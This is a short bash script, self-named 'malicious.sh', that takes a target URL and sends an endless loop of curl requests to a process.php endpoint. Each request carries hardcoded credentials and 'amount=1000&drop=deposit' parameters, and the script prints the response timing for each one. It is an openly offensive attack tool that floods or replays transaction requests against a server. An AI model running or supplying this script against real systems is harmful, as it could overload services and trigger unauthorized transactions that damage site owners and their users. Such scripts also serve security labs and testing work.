#!/bin/bash


if [ "$#" -ne 1 ];then
    echo "Usage: ./malicious.sh <target>";
    exit 0
fi

while :
do
    curl -s -w 'Lookup time:\t%{time_total}'\\n -o /dev/null "$1/process.php?user=legitimate&pass=dummy&amount=1000&drop=deposit"
done